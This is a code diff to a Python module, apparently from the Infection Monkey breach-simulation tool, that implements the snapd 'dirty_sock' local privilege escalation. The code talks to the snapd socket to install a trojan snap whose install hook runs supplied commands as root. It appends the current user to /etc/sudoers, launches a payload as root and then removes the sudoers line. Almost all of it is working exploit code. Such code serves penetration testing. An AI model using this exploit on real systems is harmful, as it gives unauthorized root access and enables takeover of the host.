@@ -1,7 +1,7 @@
 """
     Implementation is based on snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
     https://github.com/Dhayalanb/Snapd-V2
-    Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1) It is patched
+    Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1), then it might be patched
 """
 import os
 import time
@@ -9,12 +9,12 @@ import base64
 import string
 import socket
 import random
+import getpass
 import subprocess
 from logging import getLogger
 from infection_monkey.pe.actions import HostPrivExploiter
 from infection_monkey.pe.actions.tools import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
-from infection_monkey.pe.actions.tools import check_if_sudoer, shell, check_system, check_running
-
+from infection_monkey.pe.actions.tools import check_if_sudoer, shell, check_system, run_monkey_as_root
 LOG = getLogger(__name__)
 
 __author__ = "D3fa1t"
@@ -75,17 +75,10 @@ def bind_sock(sockfile):
     try:
         client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
         client_sock.bind(sockfile)
-    except socket.error as e:
-        LOG.error('Failed to bind to the socket')
-        return False
-
-    # Connect to the snap daemon
-    try:
         client_sock.connect('/run/snapd.socket')
     except socket.error as e:
         LOG.error('Failed to connect to snapd.socket! The service snapd is not running')
         return False
-
     return client_sock
 
 
@@ -167,7 +160,7 @@ Content-Type: application/octet-stream
     http_reply = client_sock.recv(8192).decode("utf-8")
 
     if 'HTTP/1.1 100 Continue' not in http_reply:
-        LOG.info("[!] Error starting POST conversation, here is the reply:\n")
+        LOG.error("[!] Error starting POST conversation, here is the reply:\n")
         # LOG.info(http_reply) debug output
         return False
 
@@ -175,13 +168,13 @@ Content-Type: application/octet-stream
     http_req2 = post_payload
     client_sock.sendall(http_req2.encode("latin-1"))
 
-    # Receive the data and extract the JSON
+    # Receive the data
     http_reply = client_sock.recv(8192).decode("utf-8")
 
     # Exit on failure
     if 'status-code":202' not in http_reply:
         LOG.info("[!] Did not work, here is the API reply:\n\n")
-        LOG.info(http_reply)  #debug output
+        LOG.info(http_reply)  # debug output
         return False
 
     # Sleep to allow time for the snap to install correctly. Otherwise,
@@ -220,7 +213,7 @@ def run_command_as_root(command):
     if not delete_snap(client_sock):
         return False
 
-    # Install the trojan snap, which has an install hook that creates a user
+    # Install the trojan snap, which has an install hook with user supplied commands
     if not install_snap(client_sock, trojan_snap):
         return False
 
@@ -236,7 +229,7 @@ class SnapdExploiter(HostPrivExploiter):
     def __init__(self):
         self.file_path = ""
         self.file_name = ""
-        self.runnableDistro = ("ubuntu", "linux")
+        self.runnableEnv = ("ubuntu", "linux")
 
     def try_priv_esc(self, command_line):
         """
@@ -253,7 +246,7 @@ class SnapdExploiter(HostPrivExploiter):
         self.file_name = self.file_path.split('/')[-1]
 
         # get the current user name
-        whoami = shell("whoami")
+        whoami = getpass.getuser()
 
         # Error reading off shell
         if not whoami:
@@ -262,7 +255,6 @@ class SnapdExploiter(HostPrivExploiter):
         # we create a temp file in /tmp as root to verify command exec as root
         alphabet = string.ascii_lowercase
         filename = ''.join(random.choice(alphabet) for _ in range(10))
-        operation = 'touch /tmp/'
 
         # add the user to the sudo group
         add_user_to_sudoers = ADDUSER_TO_SUDOERS % {'user_name': whoami}
@@ -270,12 +262,11 @@ class SnapdExploiter(HostPrivExploiter):
         if run_command_as_root(add_user_to_sudoers):
 
             # check if exploit is successful by touching a file and checking the owner
-            file_path = "/tmp/%(filename)s"
-            touch_file = "sudo " + operation + filename
+            file_path = os.path.join('/tmp/', filename)
+            touch_file = "sudo touch " + file_path
             shell(touch_file)
             LOG.info("Touching the file %s" % touch_file)
-            time.sleep(1)  # sleep un-till the file is created
-            if not check_if_sudoer(file_path %{'filename':filename}):
+            if not check_if_sudoer(file_path):
                 LOG.info("Either file doesn't exist or is not owned by root!")
                 return False
         else:
@@ -284,19 +275,16 @@ class SnapdExploiter(HostPrivExploiter):
 
         LOG.info("The command that is executed as root is %s" % add_user_to_sudoers)
         # now run the monkey as root
+        run_monkey_as_root(command_line)
 
-        command_line = "sudo " + command_line
-        monkey_process = subprocess.Popen(command_line, shell=True,
-                                          stdin=None, stdout=None, stderr=None,
-                                          close_fds=True, creationflags=0)
-
-        LOG.info("Executed monkey process as root with (PID=%d) with command line: %s",
-                 monkey_process.pid, command_line)
+        # cleaning up the temp file
+        cleanup_file = "rm "+file_path
+        shell(cleanup_file)
 
         # now remove the user from sudoers
         LOG.info("Removing the current user %s from the sudoers list", whoami)
 
-        remove_from_sudoers = REMOVE_LASTLINE % {'file_name' : "/etc/sudoers"}
+        remove_from_sudoers = REMOVE_LASTLINE % {'file_name': "/etc/sudoers"}
         subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
                          creationflags=0)
         return True
